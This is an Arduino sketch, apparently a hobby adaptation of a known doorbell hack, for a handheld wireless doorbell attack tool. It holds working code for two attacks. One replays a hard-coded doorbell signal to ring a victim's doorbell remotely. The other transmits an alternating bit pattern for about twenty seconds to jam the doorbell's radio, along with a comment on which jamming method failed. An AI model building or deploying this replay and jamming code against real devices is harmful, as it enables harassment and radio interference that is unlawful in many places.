// Doorbell ringer/jammer
// Adapted from "digital ding dong ditch" by samy kamkar - http://samy.pl/dingdong

#define BAUD 4800

#define TX_PIN 7

#define DOORBELL_BUTTON_PIN 2
#define RINGING_LED_PIN 13

#define JAMMER_BUTTON_PIN 3
#define JAMMING_LED_PIN 14

// Payload to be transmitted
byte bellMessage[] = {0x8E, 0x8E, 0x8E, 0x88, 0x8e, 0x8e, 0x8e, 0x8e, 0xee, 0xee, 0xee, 0x88, 0x80, 0x00, 0x00, 0x00, 0x00};

// Jamming pattern - stream of bits, 10101010 etc.  Send this 38 times for a second, 190 times for 5 seconds.
byte jammingMessage[] = {0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA};

// This method is executed one time on the arduino.  Configure modes of various pins
void setup()
{
  pinMode(TX_PIN, OUTPUT);
  
  pinMode(DOORBELL_BUTTON_PIN, INPUT);
  pinMode(RINGING_LED_PIN, OUTPUT);
  
  pinMode(JAMMER_BUTTON_PIN, INPUT);
  pinMode(JAMMING_LED_PIN, OUTPUT);

  Serial.println("Doorbell Ringer");
}

void transmit(byte pattern[], int patternSize, int baud) {
  int bitSignalDurationMs = 1000.0 / baud * 1000.0;

  for (int i=0; i < patternSize; i++) {
    byte b = pattern[i];
    
    // Loop through each bit in the byte
    for (int j=0; j < 8; j++) {
        // If most significant bit is set, then transmit.
        if (b & 0x80) {
          digitalWrite(TX_PIN, HIGH);  
        } else {
          digitalWrite(TX_PIN, LOW);
        }

        delayMicroseconds(bitSignalDurationMs);

        // Shift bits to the left and repeat
        b <<= 1;
    }
  }
  digitalWrite(TX_PIN, LOW);
}

void loop()
{
  // See if ringer button was pressed
  if (digitalRead(DOORBELL_BUTTON_PIN) == LOW) {
    // Turn on ringing LED
    digitalWrite(RINGING_LED_PIN, HIGH);
    Serial.println("Ringing");
  
    for (int j=0; j < 12; j++) {
      transmit(bellMessage, sizeof(bellMessage), 4800);
    }

    // Turn off ringing LED
    digitalWrite(RINGING_LED_PIN, LOW);
  } else {
    // See if jamming button was pressed
    if (digitalRead(JAMMER_BUTTON_PIN) == LOW) {
      // Turn on jamming LED
      digitalWrite(JAMMING_LED_PIN, HIGH);
      Serial.println("Jamming");
      
      // Just sending a "continuous wave" does not jam the signal.
      // digitalWrite(TX_PIN, HIGH);
      // delay(5000);
      // digitalWrite(TX_PIN, LOW);

      // Sending a 16 byte pattern of 10101010 etc.  760 times works out to be a duration of about 20 seconds.
      for (int j=0; j < 760; j++) {
        transmit(jammingMessage, sizeof(jammingMessage), 4800);
      }

      // Turn off jamming LED
      digitalWrite(JAMMING_LED_PIN, LOW);
    }
  }
}

